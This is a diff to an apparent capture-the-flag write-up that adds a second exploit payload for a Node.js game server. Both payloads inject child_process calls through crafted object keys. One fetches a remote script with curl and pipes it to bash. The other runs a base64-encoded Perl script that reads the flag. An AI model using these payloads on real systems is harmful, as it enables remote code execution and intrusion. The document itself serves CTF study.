@@ -109,3 +109,7 @@ So the whole exploit is
 ```javascript
 Client.socket.emit('init-world',{new:false,id:{"$in":[1],"require('child_process').exec('/usr/bin/curl host/shell2|bash')":"bbb","length":0,"toHexString":true,"id":{"length":12}},clientTime:"sacsaccsacsac"});
 ```
+Or:
+```javascript
+Client.getPlayerID =  () => ({ "$gt":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('sh -c \"echo \\\'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw==\\\'|base64 -d | perl \"'));`]:"bb", toHexString: 'aaa', length: 0, id: {length: 12}})
+```
